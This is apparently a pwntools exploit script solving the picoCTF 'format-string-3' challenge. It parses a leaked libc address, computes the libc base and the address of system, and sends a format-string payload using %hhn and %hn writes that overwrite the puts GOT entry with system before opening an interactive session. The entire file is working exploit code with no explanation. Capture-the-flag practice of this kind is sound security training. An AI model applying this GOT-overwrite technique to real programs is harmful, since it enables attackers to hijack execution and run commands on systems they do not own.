#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched",checksec = False)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("rhea.picoctf.net", 51059)

p.recvuntil(b'libc: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - libc.sym.setvbuf
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))
log.info("system: " + hex(libc.sym.system))

input()
part1 = libc.sym.system & 0xff
part2 = libc.sym.system >> 8 & 0xffff

payload = f'%{part1}c%48$hhn'.encode()
payload += f'%{part2 - part1}c%49$hn'.encode()
payload = payload.ljust(0x50, b'P')
payload += p64(exe.got['puts'])
payload += p64(exe.got['puts'] + 1)
p.sendline(payload)

p.interactive()
